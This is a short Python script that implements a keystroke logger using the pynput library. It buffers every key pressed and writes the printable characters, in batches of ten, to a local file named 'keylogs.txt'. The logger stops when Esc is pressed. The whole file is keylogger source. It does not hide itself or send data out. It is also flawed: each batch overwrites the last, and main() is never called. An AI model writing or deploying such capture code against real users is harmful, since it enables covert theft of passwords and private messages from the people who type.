import pynput
from pynput.keyboard import Key, Listener
import threading
import os

count = 0
keys = []

path = os.getcwd()
filename = 'keylogs.txt'
fullpath = os.path.join(path,filename)
# print(fullpath)


def main():
    def write_file(keys):
        with open(fullpath,"w") as f:
            for key in keys:
                k = str(key).replace("'","")
                if k.find("space") > 0:
                    f.write('\n')
                elif k.find("Key") == -1:
                    f.write(k)
                # f.write(str(key))

    # write_file('sample')

    def on_press(key):
        global keys,count

        keys.append(key)
        count += 1

        if count >= 10:
            count = 0
            write_file(keys)
            keys=[]


    def on_release(key):
        if key == Key.esc:
            return False

    # def key_log_stop():

    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()
        # time.sleep(2)
        # break
